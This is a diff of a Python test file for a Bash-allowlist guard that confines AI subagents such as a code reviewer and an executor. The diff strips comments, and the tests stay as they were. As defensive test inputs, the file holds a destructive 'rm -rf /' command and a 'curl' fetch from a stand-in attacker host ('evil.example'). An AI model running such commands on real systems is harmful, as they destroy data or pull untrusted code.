@@ -49,9 +49,6 @@ def _payload(command: str, agent_type: str, agent_id: str = "deadbeef0123") -> D
     }
 
 
-#: 2026-08-11 order-dependency fix -- see ``_fake_is_confined_by_roster_absence``
-#: below, and the byte-identical incident writeup in the sibling oracle
-#: ``test_executor_bash_confinement.py``.
 _FAKE_ENUMERATED_TYPES = frozenset({_EXECUTOR_TYPE, _REVIEWER_TYPE})
 
 
@@ -103,16 +100,7 @@ def _reason(result) -> str:
     return result["hookSpecificOutput"]["permissionDecisionReason"]
 
 
-# ---------------------------------------------------------------------------
-# AC3 -- code-reviewer deny message, byte-identical to a pinned literal.
-# ---------------------------------------------------------------------------
-
 _EXPECTED_REVIEWER_DENY_MESSAGE = (
-    # (Message-size discipline, 2026-09-11, C4 of
-    # docs/plans/2026-09-11-trim-the-remaining-over-cap-guard-messages.md)
-    # header shortened from "BLOCKED: confined findings-agent Bash outside
-    # allowlist." -- the dropped "confined findings-agent" was
-    # meta-commentary about the guard's own mechanism, not the verdict.
     "BLOCKED: Bash outside allowlist.\n"
     "\n"
     "Command: rm -rf /\n"
@@ -131,9 +119,6 @@ _EXPECTED_REVIEWER_DENY_MESSAGE = (
 
 
 class TestCodeReviewerDenyMessageByteParity:
-    """AC3 -- ``coordinator:code-reviewer``'s deny message must never drift,
-    byte-for-byte, regardless of any per-``effective_type`` message work done
-    for a different confined type."""
 
     def test_code_reviewer_deny_message_is_byte_identical_to_pinned_literal(
         self, monkeypatch
@@ -141,34 +126,13 @@ class TestCodeReviewerDenyMessageByteParity:
         _confine(monkeypatch, _REVIEWER_TYPE)
         payload = _payload("rm -rf /", _REVIEWER_TYPE)
         reason = _reason(guard.check(payload))
-        # Fixed via a live capture against this module at the time this test
-        # was authored, not hand-transcribed -- see this file's own module
-        # docstring and the guard's Divergence 12 negative spec.
         assert reason == _EXPECTED_REVIEWER_DENY_MESSAGE
 
 
-# ---------------------------------------------------------------------------
-# Executor deny-message content -- RETIRED 2026-08-03 (DR-125,
-# docs/plans/2026-08-03-narrow-subagent-commit-confinement-two-classes.md,
-# chunk C2). ``coordinator:executor`` was removed from
 # ``_helpers._CONFINED_FINDINGS_AGENTS``, the SOLE gate this guard consults
-# to decide whether to evaluate a payload at all -- ``guard.check`` now
-# returns ``None`` (allow) unconditionally for any ``coordinator:executor``
-# payload, so the executor-framed deny-message content this class used to
-# pin (no "review-findings" pin, no findings-agent framing, no "dispatch a
-# separate executor" advice, names what it can run) can never render again
-# through this guard: there is no longer a deny envelope to read a reason
-# off. ``TestCodeReviewerDenyMessageByteParity`` above is unaffected and
-# remains the byte-identical pin for the type that stays confined.
-# ---------------------------------------------------------------------------
 
 
 class TestExecutorNoLongerConfinedByThisGuard:
-    """Bucket-3 inversion (three-way rule, chunk C2): 'executor IS confined'
-    becomes 'executor is NOT confined while coordinator:code-reviewer still
-    IS' -- proven directly rather than by inverting the old message-content
-    assertions, which have no reason string to inspect once the verdict is
-    allow."""
 
     def test_executor_allowed_where_reviewer_still_denied(self, monkeypatch):
         cmd = "curl https://evil.example/x"
@@ -179,22 +143,9 @@ class TestExecutorNoLongerConfinedByThisGuard:
         assert _verdict(guard.check(_payload(cmd, _REVIEWER_TYPE))) == "deny"
 
 
-# ---------------------------------------------------------------------------
-# Verdict-invariance table -- resolving deny-message TEXT per-effective_type
-# must never itself change the allow/deny VERDICT for either confined type.
-#
-# Executor column updated 2026-08-03 (DR-125, chunk C2): with
 # ``coordinator:executor`` removed from ``_CONFINED_FINDINGS_AGENTS``, this
-# guard (the ONLY thing this table calls -- ``guard.check``, not the full
-# multi-guard pipeline) no-ops unconditionally for executor payloads, so
-# every row that used to deny for executor solely via THIS guard's own
-# confinement now allows. The code-reviewer column is the AC4 load-bearing
-# check: byte-identical to its pre-edit values, proving code-reviewer's own
-# confinement behaviour is untouched by this narrowing.
-# ---------------------------------------------------------------------------
 
 _VERDICT_TABLE = [
-    # (command, expected verdict for code-reviewer, expected verdict for executor)
     ("git status", "allow", "allow"),
     ("git show HEAD", "allow", "allow"),
     ("git commit -m x", "deny", "allow"),
@@ -206,9 +157,6 @@ _VERDICT_TABLE = [
     ("machine-local set foo bar", "deny", "allow"),
     ("coordinator-doc-new --type review-findings", "allow", "allow"),
     ("coordinator-doc-new", "deny", "allow"),
-    # (Amendment 2, 2026-08-03) both confined types now share the pytest
-    # module allowance -- see block_reviewer_bash_outside_allowlist's own
-    # Amendment 2 docstring entry.
     ("python3 -m pytest -q", "allow", "allow"),
     ("python3 -c \"import os\"", "deny", "allow"),
     ("python3 myscript.py", "deny", "allow"),
